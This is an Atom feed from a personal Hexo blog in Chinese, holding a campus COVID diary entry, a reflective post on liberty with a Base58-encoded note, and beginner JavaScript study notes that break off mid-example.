<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-12-01T18:36:05.991Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>年末月初</title>
    <link href="http://example.com/2022/12/01/Diary_1201/"/>
    <id>http://example.com/2022/12/01/Diary_1201/</id>
    <published>2022-11-30T16:00:00.000Z</published>
    <updated>2022-12-01T18:36:05.991Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/12.jpg" alt="彼岸花"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天发生了许多事，我却觉得有一种新鲜感。</p><h1 id="降临"><a href="#降临" class="headerlink" title="降临"></a>降临</h1><p>本来学校一直没有什么阳性，从疫情出现以来。<br>不过嘛，根据墨菲定律，也是该发生一回了。<br>我一直没有经历过，网传很多也遥远得像另一星球发生的故事让我不知该作何反应。<br>于是这一天终于到来了，昨天本来要打算出门了，但周围人口耳相传的消息总算是敲了敲我的外壳，似乎是告诉我“今天的报纸送到了哦。”<br>我自然也如老大爷般喝着茶波澜不惊地看着报纸，仿佛一切都是国际新闻--与我无关。<br>直到发现另一寝室的人跑去抢购食品了我才意识到，情况似乎有点严重？尽管如此，过了一会儿还是悠哉游哉地去食堂吃晚餐了。<br>周围一人欲出校门未果，遂转来投奔于我。饭饱之后兴致大发，逛一逛许久没走过的“校园河山”。探到通往校外的幽径，便心满意足地回去了。<br>最终也没有如猜测中封寝，大概是防疫管控的松口还是有那么一些效果，变得稍微有了个人样。<br>这便是昨天的故事。<br>今日未到教室上课，早八的网课只是伴我继续睡觉。又有新阳性的出现为这个小小的校园平添了恐慌等的负面情绪。接下来，又会如何呢？</p><h1 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h1><p>在这个事上，校方对学生以及网络都在隐瞒。恐怕是害怕事情闹大，管控不住舆论，最终导致自己承担罪责，担当替罪羊，丢掉乌纱帽。这便是常态，或许任何一个人都会感到这件事上的荒谬，经历得多了却容易让人麻木。或许很多学生都会感到恐慌气愤不解吧，可是我没什么感觉，为许许多多事愤怒过，最终平息了。即便是盛大的火山，也终有喷发完之时。这是自然规律，人也遵循人性规律。可唯有打破这种人性，才能突破桎梏，做一个痛苦的“人”。<br>产生的这些负面情绪，得不到发泄的地方，最终会造成一件事，信任缺失。校方从一开始就没有信任学生，对学生公布真实情况。这也必然造成学生无法信任学校。互相之间信任度越来越低，倘若得不到缓解终有一天会物极必反。首先从管理配合上会让校方付出更多成本代价，其次矛盾冲突也会慢慢上升，双方之间的隔阂也会逐渐加剧。往后会如何我并不可知，也不屑于知道。<br>在某国的学校与学生之间，学生是绝对的弱势群体，同gov与people的关系很相像。况且学校还有来自gov的加持，更是让差距拉得过大。悲哀的是，掌握大权却没有学生的制约，几乎没有什么办法改善。学生能如何呢？以头抢地耳！<br>很明显，在这个囚徒困境中，学校是最先背叛的那一方。那么自然也是问题最大的一方。<br>就这样吧，2点过了。</p><h1 id="灵感"><a href="#灵感" class="headerlink" title="灵感"></a>灵感</h1><p>有时候写点东西，有灵感，便如洪水般涌出。没有灵感的时候，想挤点啥都困难呢。而我写了这么多日记，今天是第一次感觉自己有点灵感。碍于时间也只能匆匆结束。<br>曾想象自己是一个作家，也许每天都在挤榨自己脑海里的一点油墨吧。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我想看书的啊，又到这个时候了，烦诶。<br>明天一定要看叔本华的 <strong>作为意志和表象的世界</strong>！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/12.jpg&quot; alt=&quot;彼岸花&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>默哀</title>
    <link href="http://example.com/2022/11/28/Diary_1128/"/>
    <id>http://example.com/2022/11/28/Diary_1128/</id>
    <published>2022-11-27T16:00:00.000Z</published>
    <updated>2022-11-28T17:37:04.152Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Say.jpg" alt="黑格尔《精神现象学》"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原谅我这一生放纵不羁爱自由。</p><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>Give me liberty, or give me death!<br>不自由，毋宁死！<br>--帕特里克·亨利</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>我本可以忍受黑暗<br>如果我不曾见过太阳<br>然而阳光已使我的荒凉<br>成为更新的荒凉<br>--艾米莉·狄金森《如果我不曾见过太阳》</p><h1 id="怎样生活"><a href="#怎样生活" class="headerlink" title="怎样生活"></a>怎样生活</h1><p>顾及太多，就不自由了。很多人，其实并非是不愿意去呼喊自由，而是身边的家人朋友乃至职业社会地位等等限制了他们。<br>所以在一个不自由的地方，呼喊自由的人，往往是年轻人以及一无所有的人。<br>这些我都不想探讨。我只想说一个话题：<br>做一只快乐的猪，还是做一个痛苦的人？<br>这是苏格拉底的一句名言，他的回答是后者。我也是。<br>我不知道这样伟大的哲学家是怎么思考的。我只知道，生命的奇迹是如此美妙，做平庸的人未免太过无聊。况且活着的喜悦是不会消失的，只要还活着，一切痛苦都无法冲散活着的那份喜悦。畏畏缩缩安分守己或许是某些人的生活方式，但不是我的作风。我也不愿与这样的人为伍。<br>我承认，我并不是完全有勇气，也不是毫无利己之心。可我更不愿因自身之枷锁而放弃对勇气等品质的追求。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天想到的两句话，比较激进，加个密(Base58_STRING utf-8)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3jDiNnSuNi6BJfuv5SCFofiTrp2pVd1erpsBoJbtp9U4N7CY9J77d8FugTKcno8nQg6M7Ytr2CLcMWmBeBhqtAeTswsaRupadz5vggntxPWvXao8gDZrfY2SZmULh</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Say.jpg&quot; alt=&quot;黑格尔《精神现象学》&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>JS study record</title>
    <link href="http://example.com/2022/11/27/JS_study/"/>
    <id>http://example.com/2022/11/27/JS_study/</id>
    <published>2022-11-26T16:00:00.000Z</published>
    <updated>2022-11-29T13:37:07.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是对于JS学习的简单记录，以便于加强自身记忆。</p><span id="more"></span><h1 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h1><p>JavaScript 是脚本语言。其特点有：轻量级，可插入HTML页面，插入后可由所有现代浏览器执行。<br>JavaScript 的用处：</p><ul><li>直接写入 HTML 输出流</li><li>对事件的反应</li><li>改变 HTML 内容</li><li>改变 HTML 图像</li><li>改变 HTML 样式</li><li>验证输入<br>注意：JavaScript和Java是两种完全不同的语言，无论在概念上还是设计上。</li></ul><h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><p>HTML 中的 Javascript 脚本代码必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<br>Javascript 脚本代码可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 部分中。<br>Javascript 脚本可以保存在外部文件，外部文件通常包含被多个网页使用的代码。<br>外部 JavaScript 文件的文件扩展名是 .js。<br>如需使用外部文件，请在 &lt;script&gt; 标签的 “src” 属性中设置该 .js 文件：<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;myScript.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：外部脚本不能包含 &lt;script&gt; 标签</p><h1 id="运行调试"><a href="#运行调试" class="headerlink" title="运行调试"></a>运行调试</h1><p>打开浏览器，F12可以查看页面情况<br>Console窗口调试 JavaScript 代码<br>可以在浏览器中创建一个小脚本执行，具体方法看最下面链接的第4节（Javascript Chrome 中运行）的末尾</p><h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p>JavaScript 没有任何打印或者输出的函数。</p><h2 id="显示数据的方式"><a href="#显示数据的方式" class="headerlink" title="显示数据的方式"></a>显示数据的方式</h2><ol><li>使用 <code>window.alert()</code> 弹出警告框</li><li>使用 <code>document.write</code> 方法将内容写到HTML文档中</li><li>使用 <code>innerHTML</code> 写入到HTML元素</li><li>使用 <code>console.log()</code> 写入到浏览器控制台</li></ol><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol><li>关于 <code>console.log()</code> ：<br>相比alert他的优点是：<br>他能看到结构化的东西，如果是alert，弹出一个对象就是[object object],但是console能看到对象的内容。<br>console不会打断你页面的操作，如果用alert弹出来内容，那么页面就死了，但是console输出内容后你页面还可以正常操作。</li><li>关于 <code>document.write()</code> ：<br>document.write是直接写入到页面的内容流，如果在写之前没有调用document.open, 浏览器会自动调用open。每次写完关闭之后重新调用该函数，会导致页面被重写。 </li><li>关于 <code>innerHTML</code> :<br>innerHTML则是DOM页面元素的一个属性，代表该元素的html内容。你可以精确到某一个具体的元素来进行更改。如果想修改document的内容，则需要修改document.documentElement.innerElement。<br>innerHTML很多情况下都优于document.write，其原因在于其允许更精确的控制要刷新页面的那一个部分。</li><li>关于 <code>window.alert()</code> :<br>window.alert(5+6) 与 window.alert(“5+6”) 输出的值是不一样的。window.alert(5+6) 会输出 11，而window.alert(“5+6”) 会输出 5+6。这是因为当用引号时会认为引号中是字符串，从而直接将引号中的内容打印出来。</li></ol><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h2><ul><li><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)  3.14</li><li><strong>字符串（String）字面量</strong> 可以使用单引号或双引号  ‘John Doe’</li><li><strong>表达式字面量</strong> 用于计算： 5+6</li><li><strong>数组（Array）字面量</strong> 定义一个数组   <code>[40, 100, 1, 5, 25, 10]</code></li><li><strong>对象（Object）字面量</strong> 定义一个对象  <code>&#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;, age:50, eyeColor:&quot;blue&quot;&#125;</code></li><li><strong>函数（Function）字面量</strong> 定义一个函数  <code>function myFunction(a, b) &#123; return a * b;&#125;</code></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量用于存储数据值。JavaScript 使用关键字 var 来定义变量， 使用等号来为变量赋值：<br><code>var x   x = 5 </code><br>注意：变量是一个名称，字面量是一个值。</p><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><p>和其它语言基本一致</p><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>在 HTML 中，JavaScript 语句用于向浏览器发出命令。<br>语句是用分号分隔 <code>x=5+6;</code></p><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>JavaScript 同样保留了一些关键字，这些关键字在当前的语言版本中并没有使用，但在以后 JavaScript 扩展中会用到。</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>双斜杠 &#x2F;&#x2F; 后的内容将会被浏览器忽略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 我不会执行</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等。<br>JavaScript是弱类型编程语言,定义变量都使用 var 定义,与 Java 这种强类型语言有区别。<br>在定义后可以通过 <code>typeOf()</code> 来获取JavaScript中变量的数据类型<br>注意: typeof 不能用来判断是 Array 还是Object<br>使用 <code>isArray</code> 方法可以判断是否为数组<br>使用 <code>instanceof</code> 操作符也可以判断是否为数组</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>JavaScript 语句可以写在函数内，函数可以重复引用：<br>引用一个函数 &#x3D; 调用函数(执行函数内的语句)。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;                                <span class="comment">// 返回 a 乘以 b 的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字母大小写"><a href="#字母大小写" class="headerlink" title="字母大小写"></a>字母大小写</h2><p>JavaScript 对大小写是敏感的<br>函数 getElementById 与 getElementbyID 是不同的。<br>同样，变量 myVariable 与 MyVariable 也是不同的。</p><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>JavaScript 使用 Unicode 字符集。<br>Unicode 覆盖了所有的字符，包含标点等字符。</p><h1 id="语句-1"><a href="#语句-1" class="headerlink" title="语句"></a>语句</h1><h2 id="分号"><a href="#分号" class="headerlink" title="分号"></a>分号</h2><p>在 JavaScript 中，用分号来结束语句是可选的。</p><h2 id="对代码行进行折行"><a href="#对代码行进行折行" class="headerlink" title="对代码行进行折行"></a>对代码行进行折行</h2><p>可以在文本字符串中使用反斜杠对代码行进行换行。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;你好 \</span></span><br><span class="line"><span class="string">世界!&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h1><p>单行注释以 <code>//</code> 开头。<br>多行注释以 <code>/*</code> 开始，以 <code>*/</code> 结尾。</p><h1 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h1><p>可以把变量看做存储数据的容器。</p><h2 id="Javascript变量"><a href="#Javascript变量" class="headerlink" title="Javascript变量"></a>Javascript变量</h2><ul><li>变量必须以字母开头</li><li>变量也能以$和_符号开头（不推荐）</li><li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li></ul><h2 id="一条语句，多个变量"><a href="#一条语句，多个变量" class="headerlink" title="一条语句，多个变量"></a>一条语句，多个变量</h2><p>可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：<br><code>var lastname=&quot;Doe&quot;, age=30, job=&quot;carpenter&quot;;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var lastname=&quot;Doe&quot;,</span><br><span class="line">age=30,</span><br><span class="line">job=&quot;carpenter&quot;;</span><br></pre></td></tr></table></figure><p>一条语句中声明的多个变量不可以同时赋同一个值:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x,y,z=1;    x,y 为 undefined， z 为 1</span><br></pre></td></tr></table></figure><h2 id="Value-x3D-undefined"><a href="#Value-x3D-undefined" class="headerlink" title="Value &#x3D; undefined"></a>Value &#x3D; undefined</h2><p>在计算机程序中，经常会声明无值的变量。未使用值来声明的变量，其值实际上是 undefined。例如：<br><code>var carname;</code></p><h2 id="重新声明-JavaScript-变量"><a href="#重新声明-JavaScript-变量" class="headerlink" title="重新声明 JavaScript 变量"></a>重新声明 JavaScript 变量</h2><p>如果重新声明 JavaScript 变量，该变量的值不会丢失：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var carname=&quot;Volvo&quot;;</span><br><span class="line">var carname;     值依然是&quot;Volvo&quot;</span><br></pre></td></tr></table></figure><h2 id="使用-let-和-const-ES6"><a href="#使用-let-和-const-ES6" class="headerlink" title="使用 let 和 const (ES6)"></a>使用 let 和 const (ES6)</h2><p>在 2015 后的 JavaScript 版本 (ES6) 允许我们使用 const 关键字来定义一个常量，使用 let 关键字定义的限定范围内作用域的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let var1 [= value1] [, var2 [= value2]] [, ..., varN [= valueN]];</span><br></pre></td></tr></table></figure><p>let允许声明一个作用域被限制在块级中的变量、语句或者表达式。在Function中局部变量推荐使用let变量，避免变量名冲突。<br>作用域规则<br>let 声明的变量只在其声明的块或子块中可用，这一点，与var相似。二者之间最主要的区别在于var声明的变量的作用域是整个封闭函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">letTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">2</span>;       <span class="comment">// 不同的变量    </span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// 2  </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数据类型-1"><a href="#数据类型-1" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="JavaScript-拥有动态类型"><a href="#JavaScript-拥有动态类型" class="headerlink" title="JavaScript 拥有动态类型"></a>JavaScript 拥有动态类型</h2><p>JavaScript 拥有动态类型。这意味着相同的变量可用作不同的类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;               <span class="comment">// x 为 undefined</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;           <span class="comment">// 现在 x 为数字</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;John&quot;</span>;      <span class="comment">// 现在 x 为字符串</span></span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>创建数组的四种方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);    <span class="comment">//这是一个预定义的数组，在创建时初始化</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ];       <span class="comment">//同样是在创建时初始化，但是这种创建更为简洁直观</span></span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="title class_">Array</span>( );   <span class="keyword">var</span> arr4 = [ ];     <span class="comment">//这两种是创建空的数组</span></span><br></pre></td></tr></table></figure><p>下面的代码创建名为 cars 的数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">cars[<span class="number">0</span>]=<span class="string">&quot;Saab&quot;</span>;</span><br><span class="line">cars[<span class="number">1</span>]=<span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">cars[<span class="number">2</span>]=<span class="string">&quot;BMW&quot;</span>;</span><br></pre></td></tr></table></figure><p>或者 (condensed array):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">firstname</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastname</span>:<span class="string">&quot;Doe&quot;</span>, <span class="attr">id</span>:<span class="number">5566</span>&#125;;</span><br></pre></td></tr></table></figure><p>上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。<br>空格和折行无关紧要。声明可横跨多行。<br>对象属性有两种寻址方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=person.<span class="property">lastname</span>;</span><br><span class="line">name=person[<span class="string">&quot;lastname&quot;</span>];</span><br></pre></td></tr></table></figure><h2 id="Undefined-和-Null"><a href="#Undefined-和-Null" class="headerlink" title="Undefined 和 Null"></a>Undefined 和 Null</h2><p>Undefined 这个值表示变量不含有值。<br>可以通过将变量的值设置为 null 来清空变量。</p><h2 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h2><p>当声明新变量时，可以使用关键词 “new” 来声明其类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> carname=<span class="keyword">new</span> <span class="title class_">String</span>;</span><br><span class="line"><span class="keyword">var</span> x=      <span class="keyword">new</span> <span class="title class_">Number</span>;</span><br><span class="line"><span class="keyword">var</span> y=      <span class="keyword">new</span> <span class="title class_">Boolean</span>;</span><br><span class="line"><span class="keyword">var</span> cars=   <span class="keyword">new</span> <span class="title class_">Array</span>;</span><br><span class="line"><span class="keyword">var</span> person= <span class="keyword">new</span> <span class="title class_">Object</span>;</span><br></pre></td></tr></table></figure><p>注意：JavaScript 变量均为对象。当声明一个变量时，就创建了一个新的对象。</p><h1 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h1><p>JavaScript 对象是拥有属性和方法的数据。</p><h2 id="访问对象方法"><a href="#访问对象方法" class="headerlink" title="访问对象方法"></a>访问对象方法</h2><p>可以使用以下语法创建对象方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">methodName : <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 代码 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用以下语法访问对象方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectName.<span class="title function_">methodName</span>()</span><br></pre></td></tr></table></figure><p>通常 methodName() 是作为对象的一个方法， methodName 是作为一个属性。如果使用 fullName 属性，不添加 (), 它会返回函数的定义。</p><h2 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h2><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionname</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</p><h2 id="局部-JavaScript-变量"><a href="#局部-JavaScript-变量" class="headerlink" title="局部 JavaScript 变量"></a>局部 JavaScript 变量</h2><p>在 JavaScript 函数内部声明的变量（使用 var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。<br>您可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。<br>只要函数运行完毕，本地变量就会被删除。</p><h2 id="全局-JavaScript-变量"><a href="#全局-JavaScript-变量" class="headerlink" title="全局 JavaScript 变量"></a>全局 JavaScript 变量</h2><p>在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。</p><h2 id="JavaScript-变量的生存期"><a href="#JavaScript-变量的生存期" class="headerlink" title="JavaScript 变量的生存期"></a>JavaScript 变量的生存期</h2><p>JavaScript 变量的生命期从它们被声明的时间开始。<br>局部变量会在函数运行以后被删除。<br>全局变量会在页面关闭后被删除。</p><h2 id="向未声明的-JavaScript-变量分配值"><a href="#向未声明的-JavaScript-变量分配值" class="headerlink" title="向未声明的 JavaScript 变量分配值"></a>向未声明的 JavaScript 变量分配值</h2><p>如果把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">carname=&quot;Volvo&quot;;</span><br></pre></td></tr></table></figure><p>将声明 window 的一个属性 carname。<br>非严格模式下给未声明变量赋值创建的全局变量，是全局对象的可配置属性，可以删除。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> var1 = <span class="number">1</span>; <span class="comment">// 不可配置全局属性</span></span><br><span class="line">var2 = <span class="number">2</span>; <span class="comment">// 没有使用 var 声明，可配置全局属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">var1</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">var1</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">var2</span>); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> var1; <span class="comment">// false 无法删除</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(var1); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> var2; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">delete</span> var2); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(var2); <span class="comment">// 已经删除 报错变量未定义</span></span><br></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>HTML 事件是发生在 HTML 元素上的事情。<br>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p><h2 id="HTML-事件"><a href="#HTML-事件" class="headerlink" title="HTML 事件"></a>HTML 事件</h2><p>HTML 事件可以是浏览器行为，也可以是用户行为。<br>以下是 HTML 事件的实例：</p><ul><li>HTML 页面完成加载</li><li>HTML input 字段改变时</li><li>HTML 按钮被点击<br>在事件触发时 JavaScript 可以执行一些代码。<br>HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span 